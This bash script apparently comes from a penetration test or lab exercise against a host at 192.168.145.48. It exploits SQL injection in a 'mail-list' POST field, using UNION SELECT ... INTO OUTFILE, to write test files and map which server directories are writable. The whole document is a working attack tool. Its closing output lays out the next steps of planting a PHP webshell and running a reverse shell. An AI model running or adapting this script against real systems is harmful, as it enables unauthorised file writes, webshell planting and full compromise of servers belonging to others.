#!/bin/bash

# Manual Testing for Writable Directories via SQLi + FILE privilege
# Target: 192.168.145.48
# User: gollum@localhost (has FILE privilege)

TARGET="http://192.168.145.48/index.php"
TEST_STRING="WRITABLE_TEST_$$"

echo "Testing Writable Directories via SQL Injection"
echo "=============================================="
echo

# Common web directories to test
DIRS=(
    "/var/www/html"
    "/var/www/html/uploads"
    "/var/www/html/images"
    "/var/www/html/files"
    "/var/www/html/tmp"
    "/var/www/html/cache"
    "/var/www/html/data"
    "/tmp"
    "/var/tmp"
    "/dev/shm"
)

# Function to test if directory is writable
test_directory() {
    local dir=$1
    local filename="test_$(date +%s).txt"
    local full_path="$dir/$filename"

    echo "[*] Testing: $full_path"

    # Attempt to write file via INTO OUTFILE
    curl -X POST "$TARGET" \
        -d "mail-list=test@test.com' UNION SELECT '$TEST_STRING' INTO OUTFILE '$full_path'-- -" \
        -s -o response_write.html 2>/dev/null

    # Check HTTP response for errors
    if grep -q "Can't create/write to file" response_write.html 2>/dev/null; then
        echo "[-] NOT writable (permission denied)"
    elif grep -q "Errcode: 2" response_write.html 2>/dev/null; then
        echo "[-] Directory doesn't exist"
    elif grep -q "already exists" response_write.html 2>/dev/null; then
        echo "[!] File already exists (directory IS writable!)"
    else
        # No error might mean success
        echo "[+] Possible write success (no error returned)"

        # Try to verify by attempting to write again (should fail with "already exists")
        curl -X POST "$TARGET" \
            -d "mail-list=test@test.com' UNION SELECT '$TEST_STRING' INTO OUTFILE '$full_path'-- -" \
            -s -o response_verify.html 2>/dev/null

        if grep -q "already exists" response_verify.html 2>/dev/null; then
            echo "[+] CONFIRMED: Directory is WRITABLE!"
            echo "    File created: $full_path"
        fi
    fi
    echo
}

# Test each directory
for dir in "${DIRS[@]}"; do
    test_directory "$dir"
done

# Cleanup
rm -f response_write.html response_verify.html 2>/dev/null

echo "====================================="
echo "Testing complete!"
echo
echo "Next steps if writable directory found:"
echo "1. Write a PHP webshell to the writable location"
echo "2. Access the webshell via browser"
echo "3. Execute reverse shell command"